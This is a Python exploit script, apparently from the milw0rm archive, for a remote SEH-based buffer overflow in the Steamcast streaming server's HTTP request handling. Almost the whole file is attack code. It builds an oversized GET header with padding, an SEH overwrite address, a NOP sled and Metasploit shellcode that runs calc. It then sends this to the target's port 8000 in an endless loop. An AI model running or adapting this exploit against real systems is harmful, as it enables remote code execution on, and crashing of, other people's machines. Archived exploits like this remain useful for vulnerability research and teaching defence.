#!/usr/bin/python
#[*] Usage   : steamcast.py [victime_ip]
#[*] Bug     : Steamcast(HTTP Request) Remote Buffer Overflow Exploit (SEH) [1]
#[*] Founder : Luigi Auriemma, thx to overflow3r for informing me about the vuln.        
#[*] Tested on :    Xp sp2 (fr)
#[*] Exploited by : His0k4
#[*] Greetings :    All friends & muslims HaCkErs (DZ),snakespc.com,secdz.com
#[*] Chi3arona houa : Serra7 merra7,koulchi mderra7 :D
#[*] Translate by Cyb3r-1st : esse7 embe7 embou :p

#Note : The problem is that we need to find a dll wich its not compiled with GS, in my case i founded idmmbc its a loaded dll of internet download manager so try to find an unsafe dll.

import sys, socket
import struct

host = sys.argv[1]
port = 8000

# win32_exec -  EXITFUNC=seh CMD=calc Size=160 Encoder=PexFnstenvSub http://metasploit.com
shellcode=(
"\x2b\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc6"
"\x90\xb4\x70\x83\xeb\xfc\xe2\xf4\x3a\x78\xf0\x70\xc6\x90\x3f\x35"
"\xfa\x1b\xc8\x75\xbe\x91\x5b\xfb\x89\x88\x3f\x2f\xe6\x91\x5f\x39"
"\x4d\xa4\x3f\x71\x28\xa1\x74\xe9\x6a\x14\x74\x04\xc1\x51\x7e\x7d"
"\xc7\x52\x5f\x84\xfd\xc4\x90\x74\xb3\x75\x3f\x2f\xe2\x91\x5f\x16"
"\x4d\x9c\xff\xfb\x99\x8c\xb5\x9b\x4d\x8c\x3f\x71\x2d\x19\xe8\x54"
"\xc2\x53\x85\xb0\xa2\x1b\xf4\x40\x43\x50\xcc\x7c\x4d\xd0\xb8\xfb"
"\xb6\x8c\x19\xfb\xae\x98\x5f\x79\x4d\x10\x04\x70\xc6\x90\x3f\x18"
"\xfa\xcf\x85\x86\xa6\xc6\x3d\x88\x45\x50\xcf\x20\xae\x60\x3e\x74"
"\x99\xf8\x2c\x8e\x4c\x9e\xe3\x8f\x21\xf3\xd5\x1c\xa5\x90\xb4\x70")

exploit = "\x41"*1003 + "\xEB\x06\x90\x90" + "\xDB\x27\x02\x10" + "\x90"*20 + shellcode

while 1:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	head =  "GET / HTTP/1.1\r\n"
	head += "Host: "+host+"\r\n"
	head += exploit+"\r\n"
	head += "\r\n\r\n"

	s.send(head)

# milw0rm.com [2009-04-13]
